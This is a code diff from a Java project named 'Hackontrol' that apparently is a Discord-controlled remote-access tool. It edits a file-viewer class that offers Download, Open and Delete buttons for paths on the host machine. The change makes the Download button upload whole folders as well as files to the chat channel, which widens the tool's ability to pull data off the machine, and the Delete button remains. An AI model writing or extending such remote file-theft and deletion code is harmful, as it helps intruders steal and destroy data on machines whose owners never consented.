@@ -22,6 +22,7 @@ import com.khopan.hackontrol.manager.button.Question.QuestionResponse;
 import com.khopan.hackontrol.manager.common.IThinkable;
 import com.khopan.hackontrol.manager.common.sender.IRepliable;
 import com.khopan.hackontrol.manager.common.sender.sendable.ISendableReply;
+import com.khopan.hackontrol.manager.common.sender.sendable.MessageCreateDataSendableListener;
 import com.khopan.hackontrol.utils.HackontrolButton;
 import com.khopan.hackontrol.utils.HackontrolError;
 import com.khopan.hackontrol.utils.HackontrolFile;
@@ -69,7 +70,15 @@ public class FileEmbedSender implements Runnable {
 
 		Hackontrol.LOGGER.info("Downloading '{}'", this.root.getAbsolutePath());
 		TimeSafeReplyHandler.start(context, consumer -> {
-			FileUpload upload = FileUpload.fromData(this.root, this.root.getName());
+			FileUpload upload;
+
+			try {
+				upload = HackontrolFile.upload(this.root);
+			} catch(Throwable Errors) {
+				HackontrolError.throwable(MessageCreateDataSendableListener.of(consumer), Errors);
+				return;
+			}
+
 			MessageCreateData message = MessageCreateData.fromFiles(upload);
 			consumer.accept(message);
 		});
@@ -139,14 +148,9 @@ public class FileEmbedSender implements Runnable {
 		}
 
 		List<ItemComponent> buttonList = new ArrayList<>();
-		boolean hasFileButton = exist && this.root.isFile();
-
-		if(hasFileButton) {
-			buttonList.add(ButtonManager.dynamicButton(ButtonStyle.SUCCESS, "Download", this :: buttonDownload));
-		}
-
+		buttonList.add(ButtonManager.dynamicButton(ButtonStyle.SUCCESS, "Download", this :: buttonDownload));
 		buttonList.add(ButtonManager.dynamicButton(ButtonStyle.SUCCESS, "Open", this :: buttonOpen));
-		buttonList.add(ButtonManager.dynamicButton(ButtonStyle.DANGER, "Delete " + (hasFileButton ? "File" : "Folder"), this :: buttonDeleteFile));
+		buttonList.add(ButtonManager.dynamicButton(ButtonStyle.DANGER, "Delete " + (exist && this.root.isFile() ? "File" : "Folder"), this :: buttonDeleteFile));
 		buttonList.add(HackontrolButton.delete());
 		messageBuilder.addActionRow(buttonList);
 		Hackontrol.LOGGER.info("File Viewer: '{}'", this.root.getAbsolutePath());
